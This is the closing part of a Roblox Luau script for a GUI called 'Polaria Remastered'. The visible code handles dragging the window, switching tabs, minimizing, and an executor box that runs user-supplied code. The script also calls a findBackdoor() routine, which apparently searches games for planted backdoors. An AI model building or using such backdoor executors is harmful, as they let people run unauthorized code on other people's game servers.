    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if (input.UserInputState == Enum.UserInputState.End) then
                    dragToggle = false
                end
            end)
        end
    end)
    
    Frame.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            dragInput = input
        end
    end)
    
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if (input == dragInput and dragToggle) then
            updateInput(input)
        end
    end)
end

local function initialize()
    dragify(Polaria["Frame_2"])
    
    loadPlayerAvatar()
    
    Polaria["Home_Tab_a"].MouseButton1Click:Connect(function() switchTab("home") end)
    Polaria["Scripts_Tab_6"].MouseButton1Click:Connect(function() switchTab("scripts") end)
    Polaria["Exe_Tab_8"].MouseButton1Click:Connect(function() switchTab("executor") end)
    Polaria["Credits_Tab_c"].MouseButton1Click:Connect(function() switchTab("credits") end)
    
    Polaria["Exe_Btn_3"].MouseButton1Click:Connect(function()
        local scriptText = Polaria["Exe_Input_5"].Text
        if scriptText and scriptText ~= "" then
            executeScript(scriptText, "luau")
        end
    end)
    
    Polaria["Clr_Btn_13"].MouseButton1Click:Connect(function()
        Polaria["Exe_Input_5"].Text = ""
    end)
    
    Polaria["Close_3"].MouseButton1Click:Connect(function()
        Polaria["PolariaRemastered"]:Destroy()
    end)
    
    local minimized = false
    Polaria["Hide_10"].MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            Polaria["Frame_2"].Size = UDim2.new(0.08257, 0, 0.11465, 0)
            Polaria["Frame_2"].Position = UDim2.new(0, 194, 0, 10)
        else
            Polaria["Frame_2"].Size = UDim2.new(0.5244, 0, 0.88844, 0)
            Polaria["Frame_2"].Position = UDim2.new(0, 194, 0, 10)
        end
    end)
    
    updateStats()
    table.insert(statsConnections, RunService.RenderStepped:Connect(updateStats))
    
    spawn(function()
        if not findBackdoor() then
            notify("Polaria Remastered", "Backdoor not found! :(", 4)
        end
    end)
    
    switchTab("home")
end

initialize()

return Polaria["PolariaRemastered"]